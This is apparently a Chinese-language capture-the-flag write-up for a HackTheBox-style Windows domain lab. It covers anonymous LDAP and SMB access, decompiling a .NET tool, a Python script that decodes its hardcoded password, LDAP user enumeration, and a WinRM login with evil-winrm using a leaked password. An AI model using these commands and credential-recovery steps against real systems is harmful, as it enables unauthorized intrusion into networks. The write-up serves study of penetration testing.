nmap扫描结果

![](https://img.mi3aka.eu.org/2022/08/acead9ca9c5935a6d3bab8a05ad5203d.png)

goby扫描结果

![](https://img.mi3aka.eu.org/2022/08/51fe2b46ae2ca57afcb87f4b45dcb5a1.png)

---

1. LDAP NULL bind匿名绑定导致登录绕过漏洞

```python
import ldap
ldapconn = ldap.initialize('ldap://10.10.11.174:389')
ldapconn.simple_bind_s('', '')
print("hello")
```

![](https://img.mi3aka.eu.org/2022/08/b341faf6958276b3c3fc7dbaa6c27387.png)

2. smb未授权访问

`smbclient -N -L 10.10.11.174`

![](https://img.mi3aka.eu.org/2022/08/06a4a0fe9ea422fe1405aab994e05e6d.png)

![](https://img.mi3aka.eu.org/2022/08/a2d13d92997550e4874bf380d230f028.png)

![](https://img.mi3aka.eu.org/2022/08/07be57dae4c8fde4581387e006811f08.png)

只有`//10.10.11.174/support-tools`可以访问

![](https://img.mi3aka.eu.org/2022/08/c2da5b7ff66e1f8f36576669887be840.png)

![](https://img.mi3aka.eu.org/2022/08/b1bd2efd7085c2d1b6f036fe17d84ed4.png)

用`dnspy`进行逆向

![](https://img.mi3aka.eu.org/2022/08/4d7a37e9b026c97494c01ce6eb2fb467.png)

```cs
// UserInfo.Services.Protected
// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318
public static string getPassword()
{
	byte[] array = Convert.FromBase64String(Protected.enc_password);
	byte[] array2 = array;
	for (int i = 0; i < array.Length; i++)
	{
		array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
	}
	return Encoding.Default.GetString(array2);
}


// UserInfo.Services.Protected
// Token: 0x06000011 RID: 17 RVA: 0x00002170 File Offset: 0x00000370
// Note: this type is marked as 'beforefieldinit'.
static Protected()
{
	Protected.enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
	Protected.key = Encoding.ASCII.GetBytes("armando");
}
```

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = "armando"


b64_password=base64.b64decode(enc_password)
password=""

for i in range(len(b64_password)):
    password+=chr((b64_password[i]^ord(key[i%len(key)]))^223)
print(password)
```

得到`nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

![](https://img.mi3aka.eu.org/2022/08/62e5e9d998b15c419e5e6f520c385e03.png)

作为ldap的密码试了这5个好像都不对???

---

重新看了一下dnspy,发现了一个`ladpquery`

```cs
public LdapQuery()
{
	string password = Protected.getPassword();
	this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
	this.entry.AuthenticationType = AuthenticationTypes.Secure;
	this.ds = new DirectorySearcher(this.entry);
}
```

去[https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/](https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/)学了一下怎样用ldapsearch进行搜索

`ldapsearch -H LDAP://support.htb -D support\\ldap -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"`

![](https://img.mi3aka.eu.org/2022/08/5a183d987b5d61353283b535e0e95215.png)

![](https://img.mi3aka.eu.org/2022/08/bbee4814558c305f2734c4252f529233.png)

1. 列出所有用户名

`ldapsearch -H LDAP://support.htb -D support\\ldap -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=support,DC=htb" "name=*" | grep "name:"`

```
name: Users
name: krbtgt
name: Domain Computers
name: Domain Controllers
name: Schema Admins
name: Enterprise Admins
name: Cert Publishers
name: Domain Admins
name: Domain Users
name: Domain Guests
name: Group Policy Creator Owners
name: RAS and IAS Servers
name: Allowed RODC Password Replication Group
name: Denied RODC Password Replication Group
name: Read-only Domain Controllers
name: Enterprise Read-only Domain Controllers
name: Cloneable Domain Controllers
name: Protected Users
name: Key Admins
name: Enterprise Key Admins
name: DnsAdmins
name: DnsUpdateProxy
name: Shared Support Accounts
name: ldap
name: support
name: smith.rosario
name: hernandez.stanley
name: wilson.shelby
name: anderson.damian
name: thomas.raphael
name: levine.leopoldo
name: raven.clifton
name: bardot.mary
name: cromwell.gerard
name: monroe.david
name: west.laura
name: langley.lucy
name: daughtler.mabel
name: stoll.rachelle
name: ford.victoria
name: Administrator
name: Guest
```

2. 发现在`name=support`时会多出一个`info`项

![](https://img.mi3aka.eu.org/2022/08/6f8fd6d890e5cd270fbb250fd885eb4f.png)

`Ironside47pleasure40Watchful`

3. goby显示`5985`端口上存在`http`服务,推测为winrm,尝试进行攻击

一开始用`pywinrm`去调用发现抛出`winrm.exceptions.InvalidCredentialsError`错误...

用[https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)进行攻击

>建议用Docker版

`./evil-winrm.rb -i 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'`

![](https://img.mi3aka.eu.org/2022/08/37fec9d0cc5a845dff52b2c6f7f2eb1c.png)

---

CS上个线

![](https://img.mi3aka.eu.org/2022/08/ae51322ea25d173ea737668a4ed64167.png)

提权暂时没有思路...